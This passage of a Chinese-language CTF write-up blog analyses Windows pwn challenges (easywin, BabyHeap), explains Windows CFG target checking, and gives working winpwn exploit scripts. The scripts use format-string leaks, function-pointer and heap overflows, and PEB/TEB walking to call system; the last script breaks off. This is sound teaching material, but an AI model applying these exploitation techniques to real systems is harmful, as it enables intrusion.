&#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Invalid type.\n"</span>);</span><br><span class="line">        v8 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    strcpy_s(v5 + <span class="number">256</span>, <span class="number">0x100</span>ui64, <span class="string">"[+] An army of %$3d%$2d B1 Battle Droid arrives on %$1s.\n"</span>);</span><br><span class="line">    *((_QWORD *)v5 + <span class="number">64</span>) = func_msg4;</span><br><span class="line">LABEL_30:;</span><br><span class="line">&#125; <span class="keyword">while</span> (v8);</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>这里在偏移0x200的位置放置了一个函数指针，在<code>attack</code>功能中会被调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> ( v5 &amp;&amp; *(_QWORD *)(v2 + <span class="number">512</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    v8 = rand() % <span class="number">100</span>;</span><br><span class="line">    v9 = rand();</span><br><span class="line">    <span class="built_in">printf</span>((<span class="keyword">char</span> *)(v2 + <span class="number">0x100</span>), v2, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v9 % <span class="number">100</span>), v8);</span><br><span class="line">    result = (*(__int64 (__fastcall **)(__int64))(v2 + <span class="number">0x200</span>))(v2);</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>首先，这个调用的参数正好书buffer本身；其次，其buffer中包含格式化字符串。<br>同时，很容易发现，在<code>edit</code>中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v2 = (__int64)fgets(v0, <span class="number">0x208</span>, v1);</span><br><span class="line"><span class="keyword">if</span> ( v2 )</span><br><span class="line">&#123;</span><br><span class="line">    v2 = <span class="number">-1</span>i64;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    ++v2;</span><br><span class="line">    <span class="keyword">while</span> ( v0[v2] );</span><br><span class="line">    <span class="keyword">if</span> ( v2 &amp;&amp; v0[v2 - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">    v0[v2 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里是可以写入0x208 bytes数据的，也就是说直接给了一个覆盖函数指针的操作；同时配合<code>attack</code>中的格式化字符串，还可以进行一次leak，需要注意的是，windows下是无法通过”%n”这种操作完成任意地址写的，”$”也无法使用。</p>
<h2 id="Windows-CFG-Control-Flow-Gaurd"><a href="#Windows-CFG-Control-Flow-Gaurd" class="headerlink" title="Windows CFG(Control Flow Gaurd)"></a>Windows CFG(Control Flow Gaurd)</h2><p>简单来说，CFG通过在间接跳转前插入校验代码，检查目标地址是否合法，从而可以组成程序控制流被劫持到非预期的地方。<br>而从细节上讲，比如：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00007FF6862A17BD                 <span class="keyword">mov</span>     <span class="built_in">rbx</span>, [<span class="built_in">rdi</span>+<span class="number">200h</span>]</span><br><span class="line"><span class="symbol">.text:</span>00007FF6862A17C4                 <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF6862A17C7                 <span class="keyword">call</span>    <span class="built_in">cs</span>:__guard_check_icall_fptr</span><br><span class="line"><span class="symbol">.text:</span>00007FF6862A17CD                 <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF6862A17D0                 <span class="keyword">call</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF6862A17D2                 <span class="keyword">jmp</span>     short loc_7FF6862A17E3</span><br></pre></td></tr></table></figure>
<p>这里需要<code>call rbx</code>，不过首先需要通过<code>__guard_check_icall_fptr</code>对<code>rbx</code>的位置进行一个校验。<br>而在win10里，这个<code>__guard_check_icall_fptr</code>的实现其实就是<code>ntdll!LdrpValidateUserCallTarget</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">LdrpValidateUserCallTarget</span><span class="params">(<span class="keyword">unsigned</span> __int64 func_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 bitmap; <span class="comment">// rdx</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 bit_offset; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    bitmap = CFGBitmap[func_addr &gt;&gt; <span class="number">9</span>];</span><br><span class="line">    bit_offset = func_addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (func_addr &amp; <span class="number">0xF</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        bit_offset &amp;= <span class="number">0xFFFFFFFFFFFFFFFE</span>ui64;</span><br><span class="line">        <span class="keyword">if</span> ( !_bittest64(&amp;bitmap, bit_offset) )</span><br><span class="line">            <span class="keyword">return</span> LdrpHandleInvalidUserCallTarget();</span><br><span class="line">LABEL_5:</span><br><span class="line">        bit_offset |= <span class="number">1u</span>i64;</span><br><span class="line">        <span class="keyword">if</span> ( _bittest64(&amp;bitmap, bit_offset) )</span><br><span class="line">            <span class="keyword">return</span> bit_offset;</span><br><span class="line">        <span class="keyword">return</span> LdrpHandleInvalidUserCallTarget();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !_bittest64(&amp;bitmap, bit_offset) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    <span class="keyword">return</span> bit_offset;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单来说，这个check流程就是：</p>
<ol>
<li><p><code>func_addr &gt;&gt; 9</code>得到对应<code>CFGBitmap</code>数组的下标，这里的原因是：</p>
<ul>
<li><p><code>CFGBitmap</code>原理是8 bytes对应1 bit，换句话说，就是8 bytes的虚拟地址空间是用<code>CFGBitmap</code>中的1 bit标记的；所以这里需要右移3。</p>
</li>
<li><p><code>CFGBitmap</code>数组是以<code>QWORD</code>单位存的，故<code>bitmap</code>也是以8 bytes也就是64 bit取的，进行判断的时候下标最大为<code>2^6-1</code>，即需要6 bit表示下标；所以这里需要右移6。</p>
</li>
<li><p>所以最后<code>func_addr &gt;&gt; 9</code>才得到对应<code>CFGBitmap</code>数组的下标。</p>
<p>综上，被check的<code>func_addr</code>实际上被分为了三个部分：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+---------------------+------------------+--------+</span><br><span class="line">|       55 bits       |       6 bits     | 3 bits |</span><br><span class="line">+---------------------+------------------+--------+</span><br><span class="line">| offset in CFGBitmap | offset in bitmap |  left  |</span><br><span class="line">+---------------------+------------------+--------+</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>如果<code>func_addr</code>的低4 bits不为0，也就是<code>func_addr</code>不是0x10对齐的，就会同时检查两个bit，一个是<code>bit_offset &amp; 0xFFFFFFFFFFFFFFFE</code>，一个是<code>bit_offset | 1</code>，举个例子：</p>
<ul>
<li><p>如果<code>func_addr = 0x101</code>，那么检查<code>bitoffset = 0x20</code>以及``bitoffset = 0x21`；</p>
</li>
<li><p>如果<code>func_addr = 0x10F</code>，那么检查<code>bitoffset = 0x20</code>以及``bitoffset = 0x21`；</p>
<p>换句话说，在<code>func_addr</code>没有0x10对齐的情况下，最后判断的相应的<code>bitmap</code>中的bit是同样的，故结果也是同样的。<br>且只有在这两个bit均为1的情况下，才能通过检查，否则都会判为无效，从而转入异常处理，也不会进行跳转。</p>
</li>
</ul>
</li>
<li><p>如果<code>func_addr</code>的低4 bits为0，也就是<code>func_addr</code>是0x10对齐的，那么会先后检查<code>bit_offset</code>和<code>bit_offset | 1</code>，举个例子：</p>
<ul>
<li>如果<code>func_addr = 0x100</code>，那么检查<code>bitoffset = 0x20</code>；如果此时<code>bit_offset</code>对应的bit为0，则再给一次机会，检查<code>bit_offset | 1</code>是否为1；如果为1，那么目标地址有效，否则无效。</li>
</ul>
<p>换句话说，在<code>func_addr</code>是0x10对齐的情况下，只要<code>bit_offset</code>或<code>bit_offset | 1</code>的其中一个对应的bit是1，那么目标地址都是有效的。</p>
</li>
<li><p>至于为何这里涉及了两个bit的检查，就不得而知了。</p>
</li>
</ol>
<p>而至于CFGBitmap是如何生成的，涉及到比较<a href="http://sjc1-te-ftp.trendmicro.com/assets/wp/exploring-control-flow-guard-in-windows10.pdf" target="_blank" rel="noopener">复杂的细节</a>。<br>对于动态链接库dll中的一些导出函数，其在<code>CFGBitmap</code>中对应的bit都是共享的，也就是说要么都合法，要么都不合法。<br>而若仅仅针对当前进程，则有几个比较重要的相关结构，在<code>_load_config_usedv</code>中可以看到</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.rdata:</span>00007FF6862A3830                 <span class="built_in">dq</span> offset __guard_check_icall_fptr <span class="comment">; GuardCFCheckFunctionPointer</span></span><br><span class="line"><span class="symbol">.rdata:</span>00007FF6862A3838                 <span class="built_in">dq</span> offset __guard_dispatch_icall_fptr <span class="comment">; GuardCFDispatchFunctionPointer</span></span><br><span class="line"><span class="symbol">.rdata:</span>00007FF6862A3840                 <span class="built_in">dq</span> offset __guard_fids_table <span class="comment">; GuardCFFunctionTable</span></span><br><span class="line"><span class="symbol">.rdata:</span>00007FF6862A3848                 <span class="built_in">dq</span> <span class="number">0Eh</span>                  <span class="comment">; GuardCFFunctionCount</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>__guard_check_icall_fptr</code>：前面已经提到过，实际指向<code>ntdll!LdrpValidateUserCallTarget</code>，做具体的检查。</li>
<li><code>__guard_dispatch_icall_fptr</code>：实际上就只是<code>jmp rax</code>，不知作何用。</li>
<li><code>__guard_fids_table</code>：该进程合法的跳转地址，也就是一个函数指针表，在程序加载的时候会完成从该RVA列表到具体CFGBitmap中对应bit的转化。</li>
<li><code>GuardCFFunctionCount</code>：即RVA列表中函数指针的个数。</li>
</ul>
<h2 id="利用思路-4"><a href="#利用思路-4" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
<li>首先利用上述提到的格式化字符串漏洞，leak出<code>ucrtbase</code>的基地址。注意由于windows程序和linux不一样，其运行的加载基址貌似在相当长的一段时间里是不会变化的（或许是不重启机器就不会变），dll的加载地址也是如此；所以一次leak，全程受用。</li>
<li>之后利用<code>edit</code>的溢出，覆盖函数指针为<code>system</code>，并布置buffer为”type,pwn\westworld.txt”，调用<code>attack</code>就会将flag打印出来。这里直接<code>system(&quot;cmd.exe&quot;)</code>弹了shell后无法交互，所以只能直接读flag了。<br> 这里还有个点就是，因为我们是没法输入空格的，所以”type flag.txt”这样的字符串是输不进去的，所以利用了一个小小的trick，也就是”type,flag.txt”中”,”在这里可以等同于空格来使用，完成这个bypass。</li>
<li>这里可以通过调试，跟到<code>LdrpValidateUserCallTarget</code>中进行判断，<code>system</code>确实是合法地址；而至于为什么<code>system</code>是合法地址，这里猜测dll的导出函数可能都会是合法的跳转地址，但是无法进行验证；这样，CFG的保护在这里似乎就没有什么作用了。</li>
</ol>
<h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./easywin.exe"</span>)</span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn", 27068)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    windbgx.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice? "</span>, choice)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(content, item)</span>:</span></span><br><span class="line">    choose(<span class="string">'a'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Target planet? "</span>, content)</span><br><span class="line">    p.sendlineafter(<span class="string">"Type?"</span>, item)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choose(<span class="string">'c'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"ID? "</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"New target planet? "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choose(<span class="string">'d'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"ID? "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span><span class="params">()</span>:</span></span><br><span class="line">    choose(<span class="string">'ll'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add('AAA', 'd')</span></span><br><span class="line"><span class="comment"># edit(0, 'A' * 0xff + '\x00' + "%p" * 5 + "ucrtbase.dll:%p" + context.newline)</span></span><br><span class="line"><span class="comment"># attack()</span></span><br><span class="line"><span class="comment"># p.recvuntil('ucrtbase.dll:')</span></span><br><span class="line"><span class="comment"># ucrtbase = int(p.recv(16), 16) - 0xE59F8</span></span><br><span class="line">ucrtbase =  <span class="number">0x7ffe46b20000</span></span><br><span class="line">system = ucrtbase + <span class="number">0xA40C0</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">'AAA'</span>, <span class="string">'d'</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'type,pwn\\westworld.txt'</span>.ljust(<span class="number">0x100</span>, <span class="string">"\x00"</span>) + <span class="string">'A'</span> * <span class="number">0xff</span> + <span class="string">"\x00"</span> + p64(system))</span><br><span class="line">attack()</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[+] ucrtbase: "</span> + hex(ucrtbase))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Windows-OGeek2019-BabyHeap-amp-Windows-ASIS-2017-Babyheap"><a href="#Windows-OGeek2019-BabyHeap-amp-Windows-ASIS-2017-Babyheap" class="headerlink" title="[Windows][OGeek2019]BabyHeap &amp; [Windows][ASIS 2017]Babyheap"></a>[Windows][OGeek2019]BabyHeap &amp; [Windows][ASIS 2017]Babyheap</h1><h2 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h2><p>传统的菜单题，其中<code>add</code>，<code>delete</code>和<code>show</code>都没有问题，只有<code>edit</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (chunk_status[dwBytes])</span><br><span class="line">&#123;</span><br><span class="line">    v16 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"And what's the length this time?"</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v16) != <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">goto</span> LABEL_49;</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Then name it again : "</span>);</span><br><span class="line">    v11 = v16;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    v13 = chunk_array[dwBytes];</span><br><span class="line">    v9 = getchar();</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (v9 == <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        v13[v4++] = v9;</span><br><span class="line">        v9 = getchar();</span><br><span class="line">    &#125; <span class="keyword">while</span> (v4 != v11);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>显然存在一个heap overflow。</p>
<h2 id="利用思路-5"><a href="#利用思路-5" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
<li>由于<code>edit</code>功能没有自动在末尾补”\x00”，所以可以通过这个leak出下一个chunk头，它是被Encoding xor加密过的，我们可以通过手动还原出原chunk头然后跟加密过的头进行xor，从而得到Encoding；同样地可以leak出heap地址。因为这个heap是通过<code>hHeap = HeapCreate(1u, 0x2000u, 0x2000u);</code>单独申请的，所以仅供当前线程使用，因此布局可预测，比较简单。</li>
<li>不同在于，linux下heap overflow通过覆盖fd，来劫持fastbin或者tcache bin的链表，达到任意地址写的目的。windows下的freelist是一个双向链表，所以要通过类似于unsorted bin的unlink attack进行利用，从而获得一个指向自己的指针。</li>
<li>通过提供的<code>shoot</code>功能，我们要将该chunk对应的<code>chunk_status</code>中的标志置为1，从而使得可写，进而达到任意地址读写的目的。</li>
<li>有了任意地址读写，就可以利用如下的一条leak链： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IAT &#x3D;&#x3D;&gt; kernel32 &#x3D;&#x3D;&gt; ntdll &#x3D;&#x3D;&gt; ntdll!PebLdr - 0x44 &#x3D;&#x3D;&gt; PEB &#x3D;&#x3D;&gt; TEB &#x3D;&#x3D;&gt; StackBase &#x3D;&#x3D;&gt; return address</span><br></pre></td></tr></table></figure>
 从而找到main函数的返回地址在栈上的位置。</li>
<li>接下来就是覆盖返回地址执行<code>system(&quot;cmd.exe&quot;)</code>了。</li>
</ol>
<h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./babyheap.exe")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="number">29639</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    windbgx.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"What's your choice?"</span>, str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"How long is your sword?"</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">"Well done! Name it!"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which sword do you want to destroy?"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which one will you polish?"</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"And what's the length this time?"</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">"Then name it again : "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which one will you check?"</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Show : "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shoot</span><span class="params">(addr)</span>:</span></span><br><span class="line">    choose(<span class="number">1337</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"So what's your target?"</span>, str(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pie</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"And here is your Novice village gift : 0x"</span>)</span><br><span class="line">    pie = int(p.recvline()[:<span class="number">-2</span>], <span class="number">16</span>) - <span class="number">0x1090</span></span><br><span class="line">    <span class="keyword">return</span> pie</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ctor_heap_head</span><span class="params">(size, flags, prev_size, remain_size)</span>:</span></span><br><span class="line">    chksum =  ((size &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xff</span>) ^ ((size &gt;&gt; <span class="number">3</span>) &gt;&gt; <span class="number">8</span>) ^ flags</span><br><span class="line">    val = (size &gt;&gt; <span class="number">3</span>) | (flags &lt;&lt; <span class="number">16</span>) | (chksum &lt;&lt; <span class="number">24</span>) | (prev_size &gt;&gt; <span class="number">3</span> &lt;&lt; <span class="number">32</span>) | (remain_size &lt;&lt; <span class="number">56</span>)</span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_info</span><span class="params">(chunk_array, addr)</span>:</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x8</span>, p32(chunk_array + <span class="number">4</span>) + p32(addr))</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    val = u32(p.recvline()[:<span class="number">-2</span>].ljust(<span class="number">4</span>, <span class="string">"\x00"</span>)[:<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">PIE = get_pie()</span><br><span class="line">chunk_array = PIE + <span class="number">0x4370</span></span><br><span class="line">chunk_status = PIE + <span class="number">0x43BC</span></span><br><span class="line">puts_iat = PIE + <span class="number">0x30C8</span></span><br><span class="line">heapfree_iat = PIE + <span class="number">0x3004</span></span><br><span class="line">ret_from_main = PIE + <span class="number">0x193b</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create three chunks</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"AAA"</span>) <span class="comment"># chunk 0</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"BBB"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"CCC"</span>) <span class="comment"># chunk 2</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"DDD"</span>) <span class="comment"># chunk 3</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"EEE"</span>) <span class="comment"># chunk 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap head and calculate encoding</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x68</span>, <span class="string">"B"</span> * <span class="number">0x60</span> + <span class="string">"heaphead"</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span 